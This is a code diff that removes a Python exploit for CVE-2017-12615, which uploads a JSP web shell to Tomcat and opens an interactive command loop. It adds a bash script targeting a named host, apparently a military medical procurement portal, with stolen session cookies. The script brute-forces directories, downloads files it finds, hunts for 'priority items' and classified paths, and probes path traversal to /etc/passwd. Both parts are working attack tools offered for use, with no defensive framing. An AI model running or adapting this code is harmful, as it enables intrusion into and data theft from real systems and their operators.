@@ -1,56 +1,204 @@
-import requests
-import sys
-import time
+#!/bin/bash
 
-url_in = sys.argv[1]
-payload_url = url_in + "/1337.jsp/"
-payload_header = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
+# Target information
+TARGET_IP="10.96.34.49"
+DOMAIN="procurement.wrnmc.mil"
+COOKIE_FILE="cookies.txt"
+PORTAL_URL="http://$DOMAIN/portal"
 
-def payload_command(command_in):
-    html_escape_table = {
-        "&": "&amp;",
-        '"': "&quot;",
-        "'": "&apos;",
-        ">": "&gt;",
-        "<": "&lt;",
-    }
-    command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in command_in)+"</string>"
-    payload_1 = command_filtered
-    return payload_1
+# Common directory wordlist
+DIRECTORIES=(
+    "documents" "contracts" "procurement" "orders" "inventory" "supplies"
+    "assets" "equipment" "medical" "pharmaceutical" "lab" "radiology"
+    "surgical" "emergency" "critical" "priority" "classified" "secret"
+    "admin" "administrative" "management" "reports" "data" "files"
+    "archive" "backup" "config" "configuration" "settings" "system"
+    "api" "rest" "graphql" "v1" "v2" "internal" "private" "secure"
+    "uploads" "downloads" "export" "import" "transfer" "share"
+    "user" "users" "employee" "employees" "staff" "personnel"
+    "vendor" "vendors" "supplier" "suppliers" "contractor" "contractors"
+    "purchase" "purchasing" "acquisition" "procure" "buy" "order"
+    "request" "requests" "requisition" "requisitions" "approval" "approvals"
+    "budget" "funding" "finance" "financial" "accounting" "billing"
+    "invoice" "invoices" "payment" "payments" "receipt" "receipts"
+    "audit" "auditing" "compliance" "regulatory" "legal" "law"
+    "security" "secure" "protected" "confidential" "sensitive"
+    "log" "logs" "history" "historical" "record" "records"
+    "database" "db" "sql" "nosql" "mongo" "postgres" "mysql"
+    "backup" "backups" "archive" "archives" "storage" "stored"
+    "temp" "tmp" "cache" "cached" "session" "sessions"
+    "test" "testing" "dev" "development" "stage" "staging"
+    "prod" "production" "live" "active" "current" "present"
+    "old" "previous" "legacy" "deprecated" "obsolete" "outdated"
+)
 
-def creat_command_interface():
-    payload_init = "<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();" \
-                "int a = -1;" \
-                "byte[] b = new byte[2048];" \
-                "while((a=in.read(b))!=-1){out.println(new String(b));}" \
-                "%>"
-    result = requests.put(payload_url, headers=payload_header, data=payload_init)
-    time.sleep(5)
-    payload = {"cmd":"whoami"}
-    verify_response = requests.get(payload_url[:-1], headers=payload_header, params=payload)
-    if verify_response.status_code == 200:
-        return 1
-    else:
-        return 0
+# File extensions to try
+EXTENSIONS=("" ".txt" ".pdf" ".doc" ".docx" ".xls" ".xlsx" ".csv" ".json" ".xml")
 
-def do_post(command_in):
-    payload = {"cmd":command_in}
-    result = requests.get(payload_url[:-1], params=payload)
-    print(result.content.decode('utf-8', errors='ignore'))
+# Function to analyze portal content and extract links
+analyze_portal() {
+    echo "=== Analyzing Portal Content ==="
+    
+    # Get portal content
+    curl -s -L --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
+        -b "$COOKIE_FILE" "$PORTAL_URL" > portal_content.html
+    
+    echo "Portal content saved to portal_content.html"
+    
+    # Extract all links from the portal
+    echo "=== Extracted Links ==="
+    grep -o 'href="[^"]*"' portal_content.html | sed 's/href="//g' | sed 's/"//g' | sort -u > links.txt
+    cat links.txt
+    
+    # Extract all forms from the portal
+    echo "=== Extracted Forms ==="
+    grep -o '<form[^>]*>' portal_content.html
+    
+    # Extract JavaScript endpoints
+    echo "=== JavaScript Endpoints ==="
+    grep -o 'fetch([^)]*)' portal_content.html
+    grep -o 'ajax[^)]*)' portal_content.html
+    grep -o '\.get[^)]*)' portal_content.html
+    grep -o '\.post[^)]*)' portal_content.html
+    
+    # Look for API endpoints
+    echo "=== Potential API Endpoints ==="
+    grep -o '/api/[^"'\'']*' portal_content.html | sort -u
+    grep -o '/v[0-9]/[^"'\'']*' portal_content.html | sort -u
+}
 
-print("***************************************************** \n"
-       "****************   Coded By 1337g  ****************** \n"
-       "*      CVE-2017-12615 Remote Command Execute EXP    * \n"
-       "***************************************************** \n")
+# Function to brute force directories
+brute_force_directories() {
+    echo "=== Starting Directory Brute Force ==="
+    
+    # Create results directory
+    mkdir -p scan_results
+    
+    for dir in "${DIRECTORIES[@]}"; do
+        echo "Testing: /portal/$dir/"
+        
+        # Try directory
+        response=$(curl -s -o /dev/null -w "%{http_code}" -L \
+            --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
+            -b "$COOKIE_FILE" "$PORTAL_URL/$dir/")
+        
+        if [ "$response" -eq 200 ] || [ "$response" -eq 301 ] || [ "$response" -eq 302 ]; then
+            echo "✓ FOUND: /portal/$dir/ (HTTP $response)"
+            echo "/portal/$dir/" >> scan_results/found_directories.txt
+            
+            # Get directory listing
+            curl -s -L --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
+                -b "$COOKIE_FILE" "$PORTAL_URL/$dir/" > "scan_results/${dir}_content.html"
+        elif [ "$response" -ne 404 ]; then
+            echo "? INTERESTING: /portal/$dir/ (HTTP $response)"
+            echo "/portal/$dir/ - HTTP $response" >> scan_results/interesting_responses.txt
+        fi
+        
+        # Try common files in each directory
+        for ext in "${EXTENSIONS[@]}"; do
+            for file in "index$ext" "readme$ext" "README$ext" "list$ext" "items$ext" "data$ext" "priority_items$ext"; do
+                response=$(curl -s -o /dev/null -w "%{http_code}" -L \
+                    --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
+                    -b "$COOKIE_FILE" "$PORTAL_URL/$dir/$file")
+                
+                if [ "$response" -eq 200 ]; then
+                    echo "✓ FILE FOUND: /portal/$dir/$file"
+                    echo "/portal/$dir/$file" >> scan_results/found_files.txt
+                    
+                    # Download the file
+                    curl -s -L --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
+                        -b "$COOKIE_FILE" "$PORTAL_URL/$dir/$file" > "scan_results/${dir}_${file}"
+                fi
+            done
+        done
+    done
+}
 
-if (creat_command_interface() == 1):
-    print("Command Page is Injected \n \n")
-else:
-    print("This host is not vulnerable")
-    exit()
+# Function to search for priority items
+search_priority_items() {
+    echo "=== Searching for Priority Items ==="
+    
+    # Direct paths to try
+    PRIORITY_PATHS=(
+        "/portal/documents/contracts/priority_items.txt"
+        "/portal/contracts/priority_items.txt"
+        "/portal/documents/priority_items.txt"
+        "/portal/priority_items.txt"
+        "/portal/items/priority.txt"
+        "/portal/procurement/priority.txt"
+        "/portal/inventory/priority.txt"
+    )
+    
+    for path in "${PRIORITY_PATHS[@]}"; do
+        echo "Trying: $path"
+        response=$(curl -s -o /dev/null -w "%{http_code}" -L \
+            --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
+            -b "$COOKIE_FILE" "http://$DOMAIN$path")
+        
+        if [ "$response" -eq 200 ]; then
+            echo "✓ FOUND: $path"
+            curl -s -L --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
+                -b "$COOKIE_FILE" "http://$DOMAIN$path" > "scan_results/priority_items_found.txt"
+            cat "scan_results/priority_items_found.txt"
+            break
+        fi
+    done
+}
 
-while True:
-    command_in = input("Enter your command here: ")
-    if command_in == "exit": 
-        exit(0)
-    do_post(command_in)
+# Function to check for common vulnerabilities
+check_vulnerabilities() {
+    echo "=== Checking for Common Vulnerabilities ==="
+    
+    # Test for path traversal
+    echo "Testing path traversal..."
+    TRAVERSAL_PATHS=(
+        "../../../../etc/passwd"
+        "....//....//....//etc/passwd"
+        "../contracts/priority_items.txt"
+    )
+    
+    for path in "${TRAVERSAL_PATHS[@]}"; do
+        response=$(curl -s -o /dev/null -w "%{http_code}" -L \
+            --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
+            -b "$COOKIE_FILE" "$PORTAL_URL/$path")
+        
+        if [ "$response" -eq 200 ]; then
+            echo "⚠ POSSIBLE VULNERABILITY: Path traversal - $path (HTTP $response)"
+        fi
+    done
+}
+
+# Main execution
+main() {
+    echo "Starting Portal Analysis and Directory Brute Force"
+    echo "Target: $DOMAIN ($TARGET_IP)"
+    echo "Cookies: $COOKIE_FILE"
+    echo "========================================="
+    
+    # Check if we can access the portal first
+    echo "Testing portal access..."
+    portal_response=$(curl -s -o /dev/null -w "%{http_code}" -L \
+        --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
+        -b "$COOKIE_FILE" "$PORTAL_URL")
+    
+    if [ "$portal_response" -ne 200 ]; then
+        echo "❌ Cannot access portal (HTTP $portal_response). Check cookies and authentication."
+        exit 1
+    fi
+    
+    echo "✓ Portal accessible (HTTP $portal_response)"
+    
+    # Run all scans
+    analyze_portal
+    brute_force_directories
+    search_priority_items
+    check_vulnerabilities
+    
+    echo "========================================="
+    echo "Scan complete! Check scan_results/ directory for findings."
+    echo "Found directories: $(cat scan_results/found_directories.txt 2>/dev/null | wc -l)"
+    echo "Found files: $(cat scan_results/found_files.txt 2>/dev/null | wc -l)"
+}
+
+# Run the script
+main
